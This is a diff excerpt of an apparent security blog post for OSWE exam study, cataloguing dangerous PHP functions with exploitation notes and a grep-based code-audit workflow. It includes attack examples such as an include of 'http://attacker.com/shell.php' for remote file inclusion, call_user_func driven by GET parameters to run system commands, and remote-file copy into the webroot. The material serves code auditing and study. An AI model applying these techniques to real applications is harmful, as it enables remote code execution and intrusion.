+</span></span><span class="line"><span class="cl"><span class="s1">&#39;array_reduce&#39;</span>               <span class="o">=&gt;</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;array_walk&#39;</span>                 <span class="o">=&gt;</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;call_user_func&#39;</span>             <span class="o">=&gt;</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;call_user_func_array&#39;</span>       <span class="o">=&gt;</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;usort&#39;</span>                      <span class="o">=&gt;</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;preg_replace_callback&#39;</span>      <span class="o">=&gt;</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;session_set_save_handler&#39;</span>   <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span>
+</span></span></code></pre></div><p><strong>Exploitation context:</strong>
+If you find <code>call_user_func($_GET['func'], $_GET['arg'])</code>, you can call <code>system</code> with any command. Even without argument control, calling <code>phpinfo</code> confirms the vulnerability. During OSWE, look for deserialization gadget chains that terminate in callback functions.</p>
+<hr>
+<h2 id="information-disclosure">Information Disclosure<a hidden class="anchor" aria-hidden="true" href="#information-disclosure">#</a></h2>
+<p>These don&rsquo;t provide code execution directly but leak configuration, paths, and credentials useful for chaining attacks.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">phpinfo</span><span class="p">()</span>           <span class="c1">// Full PHP configuration — reveals paths, extensions, disable_functions
+</span></span></span><span class="line"><span class="cl"><span class="nx">getenv</span><span class="p">()</span>            <span class="c1">// Read environment variables — may contain DB passwords, API keys
+</span></span></span><span class="line"><span class="cl"><span class="nx">get_cfg_var</span><span class="p">()</span>       <span class="c1">// Read php.ini values
+</span></span></span><span class="line"><span class="cl"><span class="nx">get_current_user</span><span class="p">()</span>  <span class="c1">// Returns username of PHP process owner
+</span></span></span><span class="line"><span class="cl"><span class="nx">getcwd</span><span class="p">()</span>            <span class="c1">// Current working directory — reveals webroot path
+</span></span></span><span class="line"><span class="cl"><span class="nx">disk_free_space</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nx">disk_total_space</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nx">proc_get_status</span><span class="p">()</span>   <span class="c1">// Information about process opened by proc_open()
+</span></span></span><span class="line"><span class="cl"><span class="nx">posix_getlogin</span><span class="p">()</span>    <span class="c1">// Username of process
+</span></span></span><span class="line"><span class="cl"><span class="nx">posix_ttyname</span><span class="p">()</span>     <span class="c1">// Terminal device name
+</span></span></span><span class="line"><span class="cl"><span class="nx">getlastmo</span><span class="p">()</span>         <span class="c1">// Last modification time of page
+</span></span></span><span class="line"><span class="cl"><span class="nx">getmygid</span><span class="p">()</span>          <span class="c1">// GID of PHP process
+</span></span></span><span class="line"><span class="cl"><span class="nx">getmyinode</span><span class="p">()</span>        <span class="c1">// Inode of current script
+</span></span></span><span class="line"><span class="cl"><span class="nx">getmypid</span><span class="p">()</span>          <span class="c1">// PID of PHP process
+</span></span></span><span class="line"><span class="cl"><span class="nx">getmyuid</span><span class="p">()</span>          <span class="c1">// UID of PHP process
+</span></span></span></code></pre></div><p><strong>Exploitation context:</strong>
+<code>phpinfo()</code> exposed publicly is always a finding. It reveals <code>disable_functions</code> (what&rsquo;s blocked), <code>open_basedir</code> (path restrictions), server paths, and loaded extensions. This directly informs your exploitation approach when other functions are disabled.</p>
+<hr>
+<h2 id="filesystem-functions">Filesystem Functions<a hidden class="anchor" aria-hidden="true" href="#filesystem-functions">#</a></h2>
+<p><strong>Write operations</strong> — arbitrary file write to webroot = RCE:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)</span>  <span class="c1">// Write data to file — RCE if webroot writable
+</span></span></span><span class="line"><span class="cl"><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">,</span> <span class="nv">$dest</span><span class="p">)</span>  <span class="c1">// Move uploaded file — file upload bypass
+</span></span></span><span class="line"><span class="cl"><span class="nx">copy</span><span class="p">(</span><span class="nv">$src</span><span class="p">,</span> <span class="nv">$dest</span><span class="p">)</span>                <span class="c1">// Copy file — with allow_url_fopen: copy remote PHP to webroot
+</span></span></span><span class="line"><span class="cl"><span class="nx">rename</span><span class="p">(</span><span class="nv">$old</span><span class="p">,</span> <span class="nv">$new</span><span class="p">)</span>               <span class="c1">// Rename/move file
+</span></span></span><span class="line"><span class="cl"><span class="nx">symlink</span><span class="p">(</span><span class="nv">$target</span><span class="p">,</span> <span class="nv">$link</span><span class="p">)</span>          <span class="c1">// Create symlink — path traversal amplifier
+</span></span></span><span class="line"><span class="cl"><span class="nx">touch</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span>                     <span class="c1">// Create empty file
+</span></span></span><span class="line"><span class="cl"><span class="nx">unlink</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span>                    <span class="c1">// Delete file — denial of service
+</span></span></span><span class="line"><span class="cl"><span class="nx">mkdir</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span>                     <span class="c1">// Create directory
+</span></span></span><span class="line"><span class="cl"><span class="nx">chmod</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="nv">$mode</span><span class="p">)</span>              <span class="c1">// Change permissions
+</span></span></span><span class="line"><span class="cl"><span class="nx">chown</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="nv">$user</span><span class="p">)</span>              <span class="c1">// Change ownership
+</span></span></span></code></pre></div><p><strong>Read operations</strong> — information disclosure, LFI:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span>         <span class="c1">// Read file contents — LFI if user-controlled
+</span></span></span><span class="line"><span class="cl"><span class="nx">file</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span>                      <span class="c1">// Read file into array
+</span></span></span><span class="line"><span class="cl"><span class="nx">readfile</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span>                  <span class="c1">// Output file contents directly
+</span></span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span>            <span class="c1">// Output file with syntax highlighting — shows source
+</span></span></span><span class="line"><span class="cl"><span class="nx">show_source</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span>               <span class="c1">// Alias for highlight_file()
+</span></span></span><span class="line"><span class="cl"><span class="nx">parse_ini_file</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span>            <span class="c1">// Parse .ini file — read config files
+</span></span></span><span class="line"><span class="cl"><span class="nx">glob</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">)</span>                   <span class="c1">// Find files matching pattern — directory listing
+</span></span></span><span class="line"><span class="cl"><span class="nx">fopen</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="nv">$mode</span><span class="p">)</span>              <span class="c1">// Open file handle
+</span></span></span></code></pre></div><p><strong>PHP version notes:</strong></p>
+<ul>
+<li><code>allow_url_fopen</code> and <code>allow_url_include</code> control whether URLs can be used as file paths — disabled by default in modern PHP but worth checking in older applications</li>
+<li>If <code>allow_url_include=On</code>, <code>include('http://attacker.com/shell.php')</code> gives RFI to RCE</li>
+</ul>
+<p><strong>Exploitation context:</strong>
+<code>copy($_GET['s'], $_GET['d'])</code> with <code>allow_url_fopen=On</code> allows copying a remote PHP file to the webroot. Also look for <code>file_put_contents</code> with user-controlled filename — if you can write a <code>.php</code> file to the webroot, you have RCE.</p>
+<hr>
+<h2 id="other-notable-functions">Other Notable Functions<a hidden class="anchor" aria-hidden="true" href="#other-notable-functions">#</a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">extract</span><span class="p">(</span><span class="nv">$array</span><span class="p">)</span>     <span class="c1">// Imports array keys as variables — register_globals-style vuln
+</span></span></span><span class="line"><span class="cl"><span class="nx">parse_str</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span>  <span class="c1">// Parses query string into variables — same risk as extract()
+</span></span></span><span class="line"><span class="cl"><span class="nx">putenv</span><span class="p">(</span><span class="nv">$setting</span><span class="p">)</span>    <span class="c1">// Set environment variable — can affect child process behaviour
+</span></span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$val</span><span class="p">)</span> <span class="c1">// Change php.ini at runtime — can re-enable dangerous settings
+</span></span></span><span class="line"><span class="cl"><span class="nx">mail</span><span class="p">(</span><span class="nv">$to</span><span class="p">,</span> <span class="nv">$subj</span><span class="p">,</span> <span class="nv">$body</span><span class="p">,</span> <span class="nv">$headers</span><span class="p">)</span>  <span class="c1">// CRLF injection in 5th param
+</span></span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span>     <span class="c1">// CRLF injection in older PHP — XSS or header injection
+</span></span></span><span class="line"><span class="cl"><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span>  <span class="c1">// PHP object injection — see deserialization attacks
+</span></span></span></code></pre></div><p><strong>Exploitation context:</strong>
+<code>extract($_GET)</code> is particularly dangerous — it turns all GET parameters into local variables, potentially overwriting <code>$admin</code>, <code>$authenticated</code>, or any other variable used in access control logic. Appears frequently in legacy PHP applications.</p>
+<hr>
+<h2 id="code-review-workflow">Code Review Workflow<a hidden class="anchor" aria-hidden="true" href="#code-review-workflow">#</a></h2>
+<p>When auditing a PHP application for OSWE, work in this order:</p>
+<ol>
+<li><strong>Find sinks</strong> — grep for dangerous function calls across the codebase</li>
+<li><strong>Trace backwards</strong> — follow the variable back to where user input enters</li>
+<li><strong>Check sanitisation</strong> — look for <code>escapeshellarg()</code>, <code>htmlspecialchars()</code>, <code>intval()</code> between source and sink</li>
+<li><strong>Identify the chain</strong> — what HTTP parameter reaches the sink and how?</li>
+<li><strong>Automate the exploit</strong> — OSWE expects a working end-to-end script, not manual steps</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Step 1: Find sinks</span>
+</span></span><span class="line"><span class="cl">grep -rn <span class="s2">&#34;system\|exec\|eval\|include\|shell_exec&#34;</span> --include<span class="o">=</span><span class="s2">&#34;*.php&#34;</span> . &gt; sinks.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Step 2: For each sink, find where the argument comes from</span>
+</span></span><span class="line"><span class="cl">grep -n <span class="s2">&#34;system(&#34;</span> . -r --include<span class="o">=</span><span class="s2">&#34;*.php&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Step 3: Check if input is sanitised between source and sink</span>
+</span></span><span class="line"><span class="cl">grep -rn <span class="s2">&#34;escapeshellarg\|escapeshellcmd\|filter_input\|htmlspecialchars&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --include<span class="o">=</span><span class="s2">&#34;*.php&#34;</span> .
+</span></span></code></pre></div><hr>
+<h2 id="references">References<a hidden class="anchor" aria-hidden="true" href="#references">#</a></h2>
+<ul>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/PHP_Configuration_Cheat_Sheet.html">OWASP PHP Security Cheat Sheet</a></li>
+<li><a href="https://stackoverflow.com/a/3697776">StackOverflow: PHP dangerous functions</a> — original source for function list</li>
+<li><a href="https://semgrep.dev/p/php">Semgrep PHP rules</a> — community ruleset for PHP security</li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#php">PayloadsAllTheThings — Command Injection</a> — exploitation payloads</li>
+<li><a href="https://www.php.net/manual/en/ini.core.php#ini.disable-functions">php.net disable_functions</a> — how to check what is blocked</li>
 </ul>
 
 
@@ -399,11 +511,13 @@
   <footer class="post-footer">
     <ul class="post-tags">
       <li><a href="https://z-r0crypt.github.io/tags/oswe/">OSWE</a></li>
-      <li><a href="https://z-r0crypt.github.io/tags/awae/">AWAE</a></li>
+      <li><a href="https://z-r0crypt.github.io/tags/awae/">Awae</a></li>
       <li><a href="https://z-r0crypt.github.io/tags/php/">Php</a></li>
       <li><a href="https://z-r0crypt.github.io/tags/rce/">Rce</a></li>
       <li><a href="https://z-r0crypt.github.io/tags/web-security/">Web-Security</a></li>
       <li><a href="https://z-r0crypt.github.io/tags/code-execution/">Code-Execution</a></li>
+      <li><a href="https://z-r0crypt.github.io/tags/code-review/">Code Review</a></li>
+      <li><a href="https://z-r0crypt.github.io/tags/semgrep/">Semgrep</a></li>
     </ul>
   </footer>
 </article>
